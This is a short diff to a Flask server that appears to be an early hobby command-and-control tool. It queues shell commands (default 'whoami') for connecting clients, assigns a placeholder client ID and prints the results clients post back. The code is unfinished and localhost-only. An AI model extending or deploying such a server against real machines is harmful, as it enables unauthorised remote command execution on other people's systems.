@@ -6,6 +6,7 @@ SERVER_URL = "http://127.0.0.1:5000"
 app = Flask(__name__)
 
 current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
+client_commands = {} # 'client_id': ['command1', 'command2'], etc.
 
 # have a data structure to hold clients?
     # if i want to run the same thing on all..? seems to be working already tho
@@ -35,13 +36,17 @@ def get_command():
 @app.route('/log-client', methods=['GET'])
 def log_client():
     # client_id = # what should this be? hostname? ip? 
-    client_commands[client_id] = "whoami"  # Default command
+    client_id = "fuck"
+    client_commands[client_id] = "whoami" # dict time
+    print("this is the client_commands dictionary:", client_commands)
     return jsonify(client_id=client_id)
 
 @app.route('/', methods=['POST'])
 def command_result():
     result = request.json.get('result') # GET from client
-    print("client command result:\n", result)
+    status = request.args.get('status')
+    print("!!!!!!!!!!client command result:\n" + result)
+    print(f"client is {status}") # hell yeah maybe put this somewhere else
     return jsonify({"status": "success"})
 
 
